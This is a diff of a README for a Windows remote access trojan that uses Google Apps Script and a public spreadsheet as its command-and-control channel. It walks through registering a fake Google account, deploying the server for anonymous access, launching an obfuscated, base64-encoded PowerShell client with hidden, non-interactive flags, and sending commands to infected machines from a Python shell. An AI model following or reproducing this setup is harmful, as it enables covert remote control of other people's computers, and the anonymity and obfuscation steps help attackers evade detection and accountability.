@@ -9,14 +9,14 @@ A RAT (Remote Access Tool) for Windows systems using google apps script as the m
 
 ## Setup
 
-### Setup Google Server and Spreadsheet Database
+### Deploying Google Server and Spreadsheet Database
 * Create a fake Google account
 * Create a spreadsheet in the fake account's Google drive
 * Make it public:
   * `File` > `Share...` > Give it a random name > `Get sharable link`
-* Paste the link into the `SPREADSHEET_URL` variable in `server.gs`
-  * remove the `?usp=sharing` at the end as well. URL should end in `/edit`
-* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.gs`
+* Paste the link into the `SPREADSHEET_URL` variable in `server.js`
+  * remove the `?usp=sharing` at the end of the URL. It should end in `/edit`
+* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.js`
 * Publish the server:
   * Save and name the project something
   * `Publish` > `Deploy as web app`
@@ -24,7 +24,7 @@ A RAT (Remote Access Tool) for Windows systems using google apps script as the m
     * Make sure the app is executed as `Me`
     * Make sure `Anyone, even anonymous` can access the app
   * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
-  * Copy the URL and paste it into `$srv` of `script.ps1`
+  * Copy the URL and paste it into `$SRV` of `script.ps1`
 
 ### Deploying Powershell Client
 **tldr** Test powershell obfuscated and base64 encoded command:
@@ -63,7 +63,9 @@ write-host $x
 * Copy the above output into the following command: `powershell.exe -noE -NonI -nOpR -eNc <output>`
 
 ### Deploying Python Shell
-* Copy the public link to Google apps server pasted into `script.ps1` and run the following command using python 3: `python script.py <url to google apps server>`
+**NOTE:** Script requires python 3
+* Copy the public link to Google apps server (same one pasted into `script.ps1`) and run the following command
+  * `python script.py <url to google apps server>`
 * Fun test commands:
   * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
   * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
